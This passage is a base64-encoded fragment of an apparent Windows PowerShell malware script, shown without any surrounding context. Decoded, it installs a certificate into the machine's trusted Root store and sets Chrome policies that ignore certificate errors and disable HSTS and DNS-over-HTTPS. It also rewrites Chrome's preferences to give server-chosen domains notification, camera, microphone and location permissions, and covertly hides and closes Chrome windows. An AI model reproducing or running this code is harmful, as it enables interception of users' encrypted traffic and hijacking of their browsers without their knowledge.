kICcxMjMnDQp9DQoNCmZ1bmN0aW9uIEluc3RhbGwtQ2VydGlmaWNhdGVUb1N0b3JlcyB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddICRDZXJ0aWZpY2F0ZUZpbGVQYXRoLA0KICAgICAgICBbc3RyaW5nXSAkUGFzc3dvcmQNCiAgICApDQoNCiAgICB0cnkgew0KICAgICAgICAkc2VjdXJlUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nIC1TdHJpbmcgJFBhc3N3b3JkIC1Bc1BsYWluVGV4dCAtRm9yY2UNCg0KICAgICAgICAjIEltcG9ydCBjZXJ0aWZpY2F0ZSB0byBQZXJzb25hbCAoTXkpIHN0b3JlDQogICAgICAgICRwZXJzb25hbFN0b3JlUGF0aCA9ICJDZXJ0OlxMb2NhbE1hY2hpbmVcTXkiDQogICAgICAgIEltcG9ydC1QZnhDZXJ0aWZpY2F0ZSAtRmlsZVBhdGggJENlcnRpZmljYXRlRmlsZVBhdGggLUNlcnRTdG9yZUxvY2F0aW9uICRwZXJzb25hbFN0b3JlUGF0aCAtUGFzc3dvcmQgJHNlY3VyZVBhc3N3b3JkIC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgIHdyaXRlZGJnICJDZXJ0aWZpY2F0ZSBpbnN0YWxsZWQgc3VjY2Vzc2Z1bGx5IHRvIFBlcnNvbmFsIHN0b3JlIChNeSkuIg0KDQogICAgICAgICMgSW1wb3J0IGNlcnRpZmljYXRlIHRvIFJvb3Qgc3RvcmUNCiAgICAgICAgJHJvb3RTdG9yZVBhdGggPSAiQ2VydDpcTG9jYWxNYWNoaW5lXFJvb3QiDQogICAgICAgIEltcG9ydC1QZnhDZXJ0aWZpY2F0ZSAtRmlsZVBhdGggJENlcnRpZmljYXRlRmlsZVBhdGggLUNlcnRTdG9yZUxvY2F0aW9uICRyb290U3RvcmVQYXRoIC1QYXNzd29yZCAkc2VjdXJlUGFzc3dvcmQgLUVycm9yQWN0aW9uIFN0b3ANCiAgICAgICAgd3JpdGVkYmcgIkNlcnRpZmljYXRlIGluc3RhbGxlZCBzdWNjZXNzZnVsbHkgdG8gUm9vdCBzdG9yZS4iDQoNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdGhyb3cgIkZhaWxlZCB0byBpbnN0YWxsIGNlcnRpZmljYXRlOiAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGRvX2NlcnQgew0KICAgIHRyeSANCiAgICB7DQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gJHhkYXRhLktleXMpIHsNCiAgICAgICAgICAgIENlcnQtV29yayAtY29udGVudFN0cmluZyAkeGRhdGFbJGtleV0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgIHdyaXRlZGJnICJBbiBlcnJvciBvY2N1cnJlZCAoQ29uZmlndXJlQ2VydGlmaWNhdGVzKTogJF8iDQogICAgICB9DQp9DQoNCmZ1bmN0aW9uIGRvX2Nocm9tZSB7DQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXERuc2NhY2hlXFBhcmFtZXRlcnMiIC1OYW1lICJFbmFibGVBdXRvRE9IIiAtVmFsdWUgMA0KDQogICAgJGNocm9tZUtleVBhdGggPSAiSEtMTTpcU29mdHdhcmVcUG9saWNpZXNcR29vZ2xlXENocm9tZSINCg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGNocm9tZUtleVBhdGgpKSB7DQogICAgICAgIE5ldy1JdGVtIC1QYXRoICRjaHJvbWVLZXlQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgfQ0KDQogICAgTmV3LUl0ZW0gLVBhdGggJGNocm9tZUtleVBhdGggLUZvcmNlIHwgT3V0LU51bGwgICMgQ3JlYXRlIHRoZSBrZXkgaWYgaXQgZG9lc24ndCBleGlzdA0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNocm9tZUtleVBhdGggLU5hbWUgIkNvbW1hbmRMaW5lRmxhZyIgLVZhbHVlICItLWlnbm9yZS1jZXJ0aWZpY2F0ZS1lcnJvcnMgLS1kaXNhYmxlLXF1aWMgLS1kaXNhYmxlLWhzdHMiDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtTmFtZSAiRG5zT3Zlckh0dHBzIiAtVmFsdWUgIm9mZiINCg0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNocm9tZUtleVBhdGggLU5hbWUgIklnbm9yZUNlcnRpZmljYXRlRXJyb3JzIiAtVmFsdWUgMQ0KDQogICAgd3JpdGVkYmcgIkNocm9tZSBjb25maWd1cmVkIg0KfQ0KDQoNCg0KZnVuY3Rpb24gQ29tcGFyZS1BcnJheXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2FycmF5XSRBcnJheTEsDQogICAgICAgIFthcnJheV0kQXJyYXkyDQogICAgKQ0KDQogICAgIyBTb3J0IGJvdGggYXJyYXlzIGFuZCBjb21wYXJlDQogICAgJGFycmF5MVNvcnRlZCA9ICRBcnJheTEgfCBTb3J0LU9iamVjdCB8IEdldC1VbmlxdWUNCiAgICAkYXJyYXkyU29ydGVkID0gJEFycmF5MiB8IFNvcnQtT2JqZWN0IHwgR2V0LVVuaXF1ZQ0KDQogICAgJGpvMSA9ICRhcnJheTFTb3J0ZWQgLWpvaW4gJywnIA0KICAgIA0KICAgICRqbzIgPSAkYXJyYXkyU29ydGVkIC1qb2luICcsJw0KDQogICAgIyBEZXRlcm1pbmUgaWYgdGhlIGFycmF5cyBhcmUgZXF1YWwgKG9yZGVyIGRvZXMgbm90IG1hdHRlcikNCiAgICBpZiAoJGpvMSAtZXEgJGpvMiApIHsNCiAgICAgICAgcmV0dXJuICR0cnVlDQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBIYXZlVG9QdXNoZXMgew0KICAgICRyZXN1bHQgPSAkZmFsc2U7DQogICAgJGV4aXN0cyA9IEAoKQ0KICAgICR0b3NldCA9IEAoKQ0KICAgICRwcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgICMgQ2hlY2sgaWYgdGhlIFByZWZlcmVuY2VzIGZpbGUgZXhpc3RzDQogICAgaWYgKFRlc3QtUGF0aCAkcHJlZmVyZW5jZXNQYXRoKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICAgICAgIyBDaGVjayBpZiB0aGUgc3RydWN0dXJlIGlzIGFzIGV4cGVjdGVkDQogICAgICAgIGlmICgkcHJlZmVyZW5jZXNDb250ZW50IC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlIC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMpIHsNCiAgICAgICAgICAgICRub3RpZmljYXRpb25TZXR0aW5ncyA9ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMubm90aWZpY2F0aW9ucw0KDQogICAgICAgICAgICAjIEl0ZXJhdGUgdGhyb3VnaCBlYWNoIGVudHJ5IGluICRub3RpZmljYXRpb25TZXR0aW5ncw0KICAgICAgICAgICAgZm9yZWFjaCAoJGZpZWxkIGluICRub3RpZmljYXRpb25TZXR0aW5ncy5QU09iamVjdC5Qcm9wZXJ0aWVzKSB7DQogICAgICAgICAgICAgICAgJHNpdGVVcmwgPSAkZmllbGQuTmFtZQ0KICAgICAgICAgICAgICAgICRleGlzdHMgKz0gUHVzaERvbWFpbiAtcHVzaFVybCAkc2l0ZVVybA0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgZm9yZWFjaCAoJHB1c2ggaW4gJHNlcnZlci5wdXNoZXMpIHsNCiAgICAgICAgJHRvc2V0ICs9IFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2gNCiAgICB9DQoNCiAgICAgJHJlc3VsdCA9IC1ub3QoQ29tcGFyZS1BcnJheXMgLUFycmF5MSAkZXhpc3RzIC1BcnJheTIgJHRvc2V0KQ0KICAgIA0KICAgIHJldHVybiAkcmVzdWx0Ow0KfQ0KDQoNCmZ1bmN0aW9uIFB1c2hEb21haW4gew0KICAgIHBhcmFtICgkcHVzaFVybCkNCg0KICAgICMgVHJpbSB0aGUgaW5wdXQgc3RyaW5nIGJlZm9yZSB0aGUgZmlyc3QgY29tbWENCiAgICAkdHJpbW1lZFVybCA9ICRwdXNoVXJsLlRyaW0oKS5TcGxpdCgnLCcpWzBdLlRyaW0oKQ0KDQogICAgIyBQYXJzZSB0aGUgVVJJDQogICAgJHBhcnNlZFVyaSA9IFtTeXN0ZW0uVXJpXTo6bmV3KCR0cmltbWVkVXJsKQ0KICAgIA0KICAgICMgRXh0cmFjdCBkb21haW4gYW5kIHBvcnQNCiAgICAkZG9tYWluID0gJHBhcnNlZFVyaS5Ib3N0DQogICAgJHBvcnQgPSBpZiAoJHBhcnNlZFVyaS5Qb3J0IC1lcSAtMSkgeyA0NDMgfSBlbHNlIHsgJHBhcnNlZFVyaS5Qb3J0IH0NCg0KICAgICMgQ29uc3RydWN0IHRoZSByZXN1bHQgVVJMDQogICAgJHJlc3VsdCA9ICJodHRwczovLyIgKyAkZG9tYWluICsgIjoiICsgIiRwb3J0LCoiDQogICAgDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCg0KZnVuY3Rpb24gUHVzaEV4aXN0cw0Kew0KICAgIHBhcmFtICgkcHVzaFVybCkNCiAgICBmb3JlYWNoICgkcHVzaCBpbiAkc2VydmVyLnB1c2hlcykgDQogICAgew0KICAgICAgICBpZiAoKFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2hVcmwpIC1lcSAoUHVzaERvbWFpbiAtcHVzaFVybCAkcHVzaCkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGZhbHNlDQp9DQoNCmZ1bmN0aW9uIFJlbW92ZS1QdXNoZXMgew0KICAgICRwcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgICMgQ2hlY2sgaWYgdGhlIFByZWZlcmVuY2VzIGZpbGUgZXhpc3RzDQogICAgaWYgKFRlc3QtUGF0aCAkcHJlZmVyZW5jZXNQYXRoKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICAgICAgIyBDaGVjayBpZiB0aGUgc3RydWN0dXJlIGlzIGFzIGV4cGVjdGVkDQogICAgICAgIGlmICgkcHJlZmVyZW5jZXNDb250ZW50IC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlIC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMpIHsNCiAgICAgICAgICAgICRub3RpZmljYXRpb25TZXR0aW5ncyA9ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMubm90aWZpY2F0aW9ucw0KDQogICAgICAgICAgICAka2V5c1RvUmVtb3ZlID0gQCgpDQoNCiAgICAgICAgICAgICMgSXRlcmF0ZSB0aHJvdWdoIGVhY2ggZW50cnkgaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzDQogICAgICAgICAgICBmb3JlYWNoICgkZmllbGQgaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzLlBTT2JqZWN0LlByb3BlcnRpZXMpIHsNCiAgICAgICAgICAgICAgICAkc2l0ZVVybCA9ICRmaWVsZC5OYW1lDQogICAgICAgICAgICAgICAgJHBlcm1pc3Npb24gPSAoUHVzaEV4aXN0cyAtcHVzaFVybCAkc2l0ZVVybCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICgkcGVybWlzc2lvbiAtZXEgJGZhbHNlKSB7DQogICAgICAgICAgICAgICAgICAgICRrZXlzVG9SZW1vdmUgKz0gJGZpZWxkLk5hbWUNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICB3cml0ZWRiZyAiJHNpdGVVcmwgaGFzbid0IGJlZW4gcmVtb3ZlZCwgaXQgaXMgYSBnb29kIHNpdGUuIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAka2V5c1RvUmVtb3ZlKSB7DQogICAgICAgICAgICAgICAgJG5vdGlmaWNhdGlvblNldHRpbmdzLlBTT2JqZWN0LlByb3BlcnRpZXMuUmVtb3ZlKCRrZXkpDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMTAwIHwgU2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtRm9yY2UNCg0KICAgICAgICAgICAgd3JpdGVkYmcgIkFsbCBzZWxlY3RlZCBwdXNoIG5vdGlmaWNhdGlvbiBzZXR0aW5ncyBoYXZlIGJlZW4gcmVtb3ZlZC4iDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICB3cml0ZWRiZyAiTm8gb3IgdW5leHBlY3RlZCBub3RpZmljYXRpb24gc2V0dGluZ3MgZm91bmQgaW4gUHJlZmVyZW5jZXMgZmlsZS4iDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICB3cml0ZWRiZyAiUHJlZmVyZW5jZXMgZmlsZSBub3QgZm91bmQgYXQgcGF0aDogJHByZWZlcmVuY2VzUGF0aCINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEFkZC1QdXNoZXN7DQogICAgZm9yZWFjaCAoJHB1c2ggaW4gJHNlcnZlci5wdXNoZXMpIHsNCiAgICAgICAgQWRkLVB1c2ggLXB1c2hVcmwgJHB1c2ggLXdvcmsgJHdvcmsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEFkZC1QdXNoIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHB1c2hVcmwNCiAgICApDQoNCiAgICAkcHVzaERvbWFpbiA9IFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2hVcmwNCg0KICAgICRjaHJvbWVQcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJGNocm9tZVByZWZlcmVuY2VzUGF0aCkpIHsNCiAgICAgICAgd3JpdGVkYmcgIkNocm9tZSBwcmVmZXJlbmNlcyBmaWxlIG5vdCBmb3VuZCBhdCBwYXRoOiAkY2hyb21lUHJlZmVyZW5jZXNQYXRoIg0KICAgICAgICBleGl0DQogICAgfQ0KDQogICAgJHByZWZlcmVuY2VzQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRjaHJvbWVQcmVmZXJlbmNlc1BhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgcHJvZmlsZSAtVmFsdWUgQHt9DQogICAgfQ0KDQogICAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcykgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBkZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMgLVZhbHVlIEB7fQ0KICAgIH0NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMucG9wdXBzKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBwb3B1cHMgLVZhbHVlIDENCiAgICB9IGVsc2Ugew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnBvcHVwcyA9IDENCiAgICB9DQoNCiAgICBpZiAoLW5vdCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnN1YnJlc291cmNlX2ZpbHRlcikgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgc3VicmVzb3VyY2VfZmlsdGVyIC1WYWx1ZSAxDQogICAgfSBlbHNlIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcy5zdWJyZXNvdXJjZV9maWx0ZXIgPSAxDQogICAgfQ0KDQogICAgJHByZWZlcmVuY2VzQ29udGVudEpzb24gPSAkcHJlZmVyZW5jZXNDb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDMyDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJGNocm9tZVByZWZlcmVuY2VzUGF0aCAtVmFsdWUgJHByZWZlcmVuY2VzQ29udGVudEpzb24gLUZvcmNlDQoNCiAgICAkcHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICBpZiAoVGVzdC1QYXRoICRwcmVmZXJlbmNlc1BhdGgpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgJGNvbnRlbnRTZXR0aW5ncyA9ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMNCiAgICAgICAgJHNldHRpbmdzVG9VcGRhdGUgPSBAKA0KICAgICAgICAgICAgImF1dG9fcGljdHVyZV9pbl9waWN0dXJlIiwgImJhY2tncm91bmRfc3luYyIsICJjYW1lcmEiLCAiY2xpcGJvYXJkIiwgImNvb2tpZXMiLCANCiAgICAgICAgICAgICJnZW9sb2NhdGlvbiIsICJpbWFnZXMiLCAiamF2YXNjcmlwdCIsICJtaWNyb3Bob25lIiwgIm1pZGlfc3lzZXgiLCANCiAgICAgICAgICAgICJub3RpZmljYXRpb25zIiwgInBvcHVwcyIsICJwbHVnaW5zIiwgInNvdW5kIiwgInVuc2FuZGJveGVkX3BsdWdpbnMiLCANCiAgICAgICAgICAgICJhdXRvbWF0aWNfZG93bmxvYWRzIiwgImZsYXNoX2RhdGEiLCAibWl4ZWRfc2NyaXB0IiwgInNlbnNvcnMiLCJ3aW5kb3dfcGxhY2VtZW50Iiwid2ViaWRfYXBpIiwidnIiLA0KICAgICAgICAgICAgInN1YnJlc291cmNlX2ZpbHRlciIsIm1lZGlhX3N0cmVhbV9taWMiLCJtZWRpYV9zdHJlYW1fbWljIiwibWVkaWFfc3RyZWFtX2NhbWVyYSIsImxvY2FsX2ZvbnRzIiwNCiAgICAgICAgICAgICJqYXZhc2NyaXB0X2ppdCIsImlkbGVfZGV0ZWN0aW9uIiwiY2FwdHVyZWRfc3VyZmFjZV9jb250cm9sIiwiYXIiDQoNCiAgICAgICAgKQ0KDQogICAgICAgIGZvcmVhY2ggKCRzZXR0aW5nIGluICRzZXR0aW5nc1RvVXBkYXRlKSB7DQogICAgICAgICAgICBpZiAoJG51bGwgLWVxICRjb250ZW50U2V0dGluZ3MuJHNldHRpbmcpIHsNCiAgICAgICAgICAgICAgICAkY29udGVudFNldHRpbmdzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJHNldHRpbmcgLVZhbHVlIEB7fQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHNwZWNpZmljU2V0dGluZyA9ICRjb250ZW50U2V0dGluZ3MuJHNldHRpbmcNCiAgICAgICAgICAgIGlmICgkc3BlY2lmaWNTZXR0aW5nLlBTT2JqZWN0LlByb3BlcnRpZXMuTmFtZSAtY29udGFpbnMgJHB1c2hEb21haW4pIHsgICAgICAgICAgICANCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHNwZWNpZmljU2V0dGluZyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICRwdXNoRG9tYWluIC1WYWx1ZSBAew0KICAgICAgICAgICAgICAgICAgICAibGFzdF9tb2RpZmllZCIgPSAiMTMzNjI3MjA1NDU3ODU3NzQiDQogICAgICAgICAgICAgICAgICAgICJzZXR0aW5nIiA9IDENCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGNvbnRlbnRTZXR0aW5ncy4kc2V0dGluZyA9ICRzcGVjaWZpY1NldHRpbmcNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMgPSAkY29udGVudFNldHRpbmdzDQogICAgICAgICR1cGRhdGVkUHJlZmVyZW5jZXNKc29uID0gJHByZWZlcmVuY2VzQ29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMA0KICAgICAgICAkdXBkYXRlZFByZWZlcmVuY2VzSnNvbiB8IFNldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLUVuY29kaW5nIFVURjgNCg0KICAgICAgICB3cml0ZWRiZyAiTm90aWZpY2F0aW9uIHN1YnNjcmlwdGlvbiBmb3IgJHB1c2hEb21haW4gYWRkZWQgc3VjY2Vzc2Z1bGx5IHdpdGggYWxsIHBlcm1pc3Npb25zLiINCiAgICB9IGVsc2Ugew0KICAgICAgICB3cml0ZWRiZyAiUHJlZmVyZW5jZXMgZmlsZSBub3QgZm91bmQgYXQgcGF0aDogJHByZWZlcmVuY2VzUGF0aCINCiAgICB9DQp9DQoNCg0KDQpmdW5jdGlvbiBDbG9zZS1DaHJvbWVXaW5kb3cgew0KICAgIHBhcmFtICgkd2luZG93KQ0KICAgIFtVc2VyMzJYXTo6Q2xvc2VXaW5kb3coJHdpbmRvdykgfCBPdXQtTnVsbA0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMjUNCn0NCg0KZnVuY3Rpb24gQ2xvc2UtQ2hyb21lIHsNCiAgICBwYXJhbSAoJHByb2Nlc3MpDQogICAgQ2xvc2UtQ2hyb21lV2luZG93IC13aW5kb3cgJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZQ0KICAgIHRyeSB7DQogICAgICAgICRwcm9jZXNzLkNsb3NlKCkNCiAgICB9DQogICAgY2F0Y2ggew0KICANCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gQ2xvc2UtQWxsQ2hyb21lcyB7DQogICAgJHdpbmRvd3MgPSBbVXNlcjMyWF06OkVudW1lcmF0ZUFsbFdpbmRvd3MoKQ0KICAgIGZvcmVhY2ggKCR3aW5kb3cgaW4gJHdpbmRvd3MpIA0KICAgIHsNCiAgICAgICAgJHRpdGxlID0gW1VzZXIzMlhdOjpHZXRXaW5kb3dUZXh0KCR3aW5kb3cpDQogICAgICAgIGlmICgkdGl0bGUuQ29udGFpbnMoIkdvb2dsZSBDaHJvbWUiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgW1VzZXIzMlhdOjpTaG93V2luZG93KCR3aW5kb3csIFtVc2VyMzJYXTo6U1dfSElERSkgfCBPdXQtTnVsbA0KICAgICAgICAgICAgQ2xvc2UtQ2hyb21lV2luZG93IC13aW5kb3cgJHdpbmRvdw0KICAgICAgICB9DQogICAgfQ0KICAgIENsb3NlLVByb2Nlc3NlcyhAKCdjaHJvbWUuZXhlJykpDQogICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA1DQp9DQoNCmZ1bmN0aW9uIENvbmZpZ3VyZUNocm9tZVB1c2hlcyB7DQogICAgJGF1dG8gPSBUZXN0LUF1dG9zdGFydDsNCiAgICBpZiAoJHNlcnZlci5wdXNoZXNGb3JjZSAtbmUgJGZhbHNlIC1hbmQgJGF1dG8gLWVxICR0cnVlKQ0KICAgIHsNCiAgICAgICAgd3JpdGVkYmcgIlNraXBwaW5nIENvbmZpZ3VyZUNocm9tZVB1c2hlcyINCiAgICAgICAgcmV0dXJuDQogICAgfQ0KICAgIHRyeSB7DQogICAgICAgIA0KICAgDQoNCiAgICBBZGQtVHlwZSBAIg0KICAgIHVzaW5nIFN5c3RlbTsNCiAgICB1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsNCiAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQogICAgdXNpbmcgU3lzdGVtLlRleHQ7DQoNCiAgICBwdWJsaWMgc3RhdGljIGNsYXNzIFVzZXIzMlggew0KICAgICAgICBwdWJsaWMgZGVsZWdhdGUgYm9vbCBFbnVtV2luZG93c1Byb2MoSW50UHRyIGhXbmQsIEludFB0ciBsUGFyYW0pOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bVdpbmRvd3MoRW51bVdpbmRvd3NQcm9jIGxwRW51bUZ1bmMsIEludFB0ciBsUGFyYW0pOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0KEludFB0ciBoV25kLCBTdHJpbmdCdWlsZGVyIGxwU3RyaW5nLCBpbnQgbk1heENvdW50KTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dExlbmd0aChJbnRQdHIgaFduZCk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBJc1dpbmRvd1Zpc2libGUoSW50UHRyIGhXbmQpOw0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldFdpbmRvd1RleHQoSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgIGludCBsZW5ndGggPSBHZXRXaW5kb3dUZXh0TGVuZ3RoKGhXbmQpOw0KICAgICAgICAgICAgaWYgKGxlbmd0aCA9PSAwKSByZXR1cm4gU3RyaW5nLkVtcHR5Ow0KDQogICAgICAgICAgICBTdHJpbmdCdWlsZGVyIHNiID0gbmV3IFN0cmluZ0J1aWxkZXIobGVuZ3RoICsgMSk7DQogICAgICAgICAgICBHZXRXaW5kb3dUZXh0KGhXbmQsIHNiLCBzYi5DYXBhY2l0eSk7DQogICAgICAgICAgICByZXR1cm4gc2IuVG9TdHJpbmcoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBJc1dpbmRvd